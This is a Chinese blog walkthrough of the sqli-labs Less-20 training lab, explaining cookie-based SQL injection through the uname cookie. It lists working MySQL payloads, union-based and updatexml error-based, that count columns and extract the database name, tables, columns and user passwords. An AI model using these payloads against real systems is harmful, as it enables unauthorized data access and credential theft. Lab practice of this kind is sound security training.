# 原创
：  （手工）【sqli-labs20】cookie注入:原理、利用过程

# （手工）【sqli-labs20】cookie注入:原理、利用过程

**目录**

[推荐：](#%C2%A0%E6%8E%A8%E8%8D%90%EF%BC%9A)

[一、（手工）SQL注入基本步骤：](#%E4%B8%80%E3%80%81%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%88%E6%89%8B%E5%B7%A5%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A)

[二、Less20（POST-Cookie injections -Uagent field -Error based）](#%E4%BA%8C%E3%80%81Less8%EF%BC%88GET%20-%20Blind%20-%20Boolian%20Based%20-%20Single%20Quotes%EF%BC%89)

[2.1、简介：（Cookie注入）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[2.2、第一步：注入点测试](#2.2%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95)

[ 2.3、第二步：分析过滤](#%C2%A02.3%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%88%86%E6%9E%90%E8%BF%87%E6%BB%A4)

[2.4、第三步：暴库](#2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%9A%B4%E5%BA%93)

[2.5、第四步：爆表名](#%C2%A0%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%88%86%E8%A1%A8%E5%90%8D)

[2.6、第五步：爆字段](#%C2%A0%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5)

[2.7、第六步：爆数据](#%C2%A0%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

---


> 
<h2>推荐：</h2>
[【SQL注入】cookie注入：原理、步骤、示例<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125685994?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/125685994?spm=1001.2014.3001.5501)


---


---


## 一、（手工）SQL注入基本步骤：

> 
第一步：注入点测试
第二步：分析权限、过滤
第三步：爆数据库名
第四步：爆表名
第五步：爆字段名
第六步：爆数据


---


---


## 二、Less20（POST-Cookie injections -Uagent field -Error based）

> 
<h3>2.1、简介：（Cookie注入）</h3>
请求方法：POST
方法：Cookie注入报错回显



> 
<h3>2.2、第一步：注入点测试</h3>
输入框测试都不存在注入点

 登录进去以后
回显有User-Agent、IP、Cookie、id、username、password

Cookie特征可以看出： 
登陆后将uname写入了Cookie中
每次请求时，判断Cookie是否存在，若存在则读取Cookie中字段uname；不存在则为登录界面
用户存在则将查询到用户id、username、password回显



> 
<h3> 2.3、第二步：分析过滤</h3>
在输入框中尝试都未报错
对输入框都进行了过滤
接下来：
方法一：获得源码，寻找过滤不严谨的地方
方法二：寻找其他注入点（Header）
<hr/>
尝试对cookie进行注入
uname=admin' order by 3#
（或者uname=1' union select 1,2,3#）
正常回显

 uname=admin' order by 4#
存在回显报错

说明存在注入点（单引号闭合）
且字段数为3


> 
<h3>2.4、第三步：暴库</h3>
uname=' union select 1,2,(updatexml(1,concat(0x7e, database(),0x7e),1))#

或者
uname=1' union select 1,2,database()#

 


> 
<h3>2.5、第四步：爆表名</h3>
uname=' union select 1,2,(updatexml(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1))#


或者
uname=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'#

 


> 
<h3>2.6、第五步：爆字段</h3>
uname=' union select 1,2,(updatexml(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1))#

或者
uname=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'#

 


> 
<h3>2.7、第六步：爆数据</h3>
uname=' union select 1,2,(updatexml(1,concat(0x7e, (select group_concat(username,'-',password) from security.users),0x7e),1))#


或者 
uname=1' union select 1,2,group_concat(concat('-',id,username,password)) from users#

 

